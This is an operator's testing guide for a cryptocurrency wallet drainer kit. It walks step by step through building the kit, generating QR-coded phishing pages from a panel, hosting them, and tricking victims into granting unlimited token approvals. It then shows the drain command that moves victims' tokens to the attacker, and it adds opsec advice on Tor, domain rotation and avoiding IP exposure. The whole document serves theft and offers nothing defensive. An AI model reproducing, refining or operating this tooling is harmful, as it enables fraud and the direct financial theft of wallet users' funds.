# verify.md — operator verification guide (victim's perspective, no burner phone)

**Testing is required before first live use.** The code ships with all unit
and integration gates passing (see `functionality.md`), but the victim's
experience depends on the wallet app version — you must see it with your own
eyes once. This guide gets you the full victim experience **without a burner
phone**: desktop extensions, a throwaway wallet on your own phone, or an
Android emulator — your choice per stage.

Golden rule: use a **throwaway wallet** (fresh seed phrase, zero real funds)
for every scan test. Test on **testnets** first. Retire the static domain
after testing (your IP hits the static host when you scan — a visitor IP on a
host that sees millions, but rotate anyway).

---

## Stage 0 — offline checks (no wallet needed, 10 min)

```bash
cd drainer
./test.sh                       # vet + race + EIP-155 vector: must all pass
./build.sh                      # release binaries + strings gates: must pass
```

QR roundtrip (proves the code the victim's camera will see):

```bash
./holocaust -conf /tmp/v.json -listen 127.0.0.1:8899 &   # bootstrap w/ HOLOCAUST_PASS
curl -c /tmp/vj -X POST -d "password=YourPass" http://127.0.0.1:8899/login -o /dev/null
curl -b /tmp/vj -X POST -d "chain=eth-1&addr=0x1111111111111111111111111111111111111111" \
     http://127.0.0.1:8899/receiver -o /dev/null
curl -b /tmp/vj -X POST -d "domain=https://test-hop.example&chain=eth-1&mode=approve" \
     http://127.0.0.1:8899/generate -o /tmp/v.html
python3 - <<'EOF'
import re, base64, html as H
s = open('/tmp/v.html').read()
m = re.search(r'src="data:image/png;base64,([^"]+)"', s)
open('/tmp/v.png','wb').write(base64.b64decode(H.unescape(m.group(1))))
EOF
zbarimg --quiet /tmp/v.png      # must print the /p/<token> URL = panel output
```

Panel behind Tor: optional at test time (already proven E2E). If you want it:
follow `tor-security.md` §4.2 and hit the panel through the onion.

---

## Stage 1 — approve mode, the real victim prompt (desktop, 20 min)

The hop page uses the injected `window.ethereum` provider — identical logic
runs in a desktop browser extension. This is the closest thing to the victim's
screen without a phone.

1. Install **MetaMask extension** in a clean browser profile; create a
   **throwaway account**; switch to a **testnet** (e.g. Sepolia or BSC testnet).
2. Get testnet gas from the official faucet for that testnet.
3. Pick a **real token contract on that testnet** — any faucetable ERC-20
   (e.g. Wrapped BNB on BSC testnet; confirm the exact address on the testnet
   explorer — do not trust an address from memory).
4. In the panel: receiver = your throwaway receiver address, chain = matching
   mainnet of that testnet (BSC testnet → `eth-56`), mode = `approve`,
   token = the testnet token contract from step 3, domain = your test static
   host. Upload the hop page (panel shows the exact path) to a static host
   (Netlify Drop takes 30 seconds).
5. In the desktop browser (NOT in the wallet, plain browser with extension):
   open `https://<your-static-host>/p/<token>` — the victim's page.
6. Observe: spinner page → MetaMask pops `approve(<receiver>, MAX)` on the
   token. Confirm. That is byte-for-byte the victim's approve experience.
7. Verify persistence: on the testnet explorer, check the allowance from your
   throwaway address to your receiver — `115792089237316195423570985008687…`.

---

## Stage 2 — the drain side (desktop, 10 min)

With Stage 1's allowance live on the testnet:

```bash
./drain -key <receiver-eoa-privkey> \
        -rpc  https://rpc.sepolia.org   `# or the matching testnet RPC` \
        -chain eth-1 \
        -from <throwaway-address> -to <receiver> \
        -token <testnet-token-address> -amount all
```

Dry run prints the raw signed `transferFrom` (EIP-155, proven vector).
Re-run with `-send` to broadcast. Then re-check the allowance on the explorer:
it is unchanged (allowance stays MAX — that is the persistence feature) while
the token balance moved to your receiver. **That is the whole money path.**

---

## Stage 3 — pay mode + deeplinks (needs a phone; no burner required)

Pay mode ends in the wallet's own deeplink route, so the true experience is
mobile. Two no-burner-phone options:

- **Option A (your daily phone, throwaway wallet):** install the wallet app,
  create a fresh seed, import no real funds, testnet only. Scan the QR from
  the panel with the phone camera. What you must see: normal https link →
  hop page → wallet app opens on its own send screen with amount pre-filled.
  Your IP touches the static host — fine for a test, rotate the domain after.
- **Option B (emulator, fully isolated):** Android Studio AVD or Waydroid,
  install the wallet APK, repeat option A inside the emulator. Zero contact
  with your daily device.

Chain checks per deeplink builder (pay mode):
- EVM: `metamask.app.link/send/…` opens the send screen pre-filled.
- Trust: `link.trustwallet.com/payment?asset=…` opens the payment screen.
- Solana: `solana:<addr>?amount=…` opens Phantom/Solflare send screen.
(If a wallet app updates its routes, re-run this stage — that is exactly why
this file exists.)

---

## Stage 4 — what "done" looks like

| Check | Pass condition |
|---|---|
| Stage 0 | test.sh + build.sh green, zbarimg roundtrip matches panel output |
| Stage 1 | approve(MAX) prompt appears from the wallet itself; allowance visible on explorer |
| Stage 2 | drain moves testnet tokens; allowance remains MAX |
| Stage 3 | deeplink opens the wallet's own pre-filled send screen |
| Opsec  | hop page makes no external requests (check devtools/network tab in Stage 1) |

If any stage fails, the failing piece is the wallet version's deeplink or the
static-host upload path — re-check `functionality.md` §"Environment-dependent"
and the exact upload path the panel printed.
